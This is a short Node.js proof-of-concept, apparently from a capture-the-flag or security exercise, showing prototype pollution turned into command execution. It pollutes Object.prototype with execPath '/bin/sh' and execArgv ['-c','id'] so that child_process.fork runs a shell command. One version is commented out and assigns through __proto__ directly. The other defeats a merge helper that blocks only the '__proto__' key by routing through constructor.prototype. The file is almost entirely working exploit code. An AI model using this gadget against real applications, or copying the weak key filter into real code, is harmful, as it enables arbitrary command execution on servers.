const { fork } = require("child_process");

// Example 1 (easy)
// const a = {}
// a.__proto__.execPath = '/bin/sh'
// a.__proto__.execArgv = ['-c', 'id']
// fork('yeeeet')

// Example 2 (hard)
const ObjectHelper = {
    isObject(obj) {
        return typeof obj === 'function' || typeof obj === 'object';
    },

    isValidKey(key) {
        const valid = key !== '__proto__';
        console.log(`isValidKey(${key}) = ${valid}`)
        return valid
    },

    merge(target, source) {
        console.log(`Merging: ${JSON.stringify(source)}`)
        for (let key in source) {
            console.log({ key })
            if (this.isValidKey(key)){
                if (this.isObject(target[key]) && this.isObject(source[key])) {
                    this.merge(target[key], source[key]);
                } else {
                    target[key] = source[key];
                }
            } else {
                console.log(`Invalid key: ${key}`)
            }
        }
        return target;
    },

    clone(target) {
        return this.merge({}, target);
    }
}

const b = ObjectHelper.clone({
    constructor: {
        prototype: {
            execPath: '/bin/sh',
            execArgv: ['-c', 'id']
        }
    }
})
console.log(b)
fork('yeeeet')
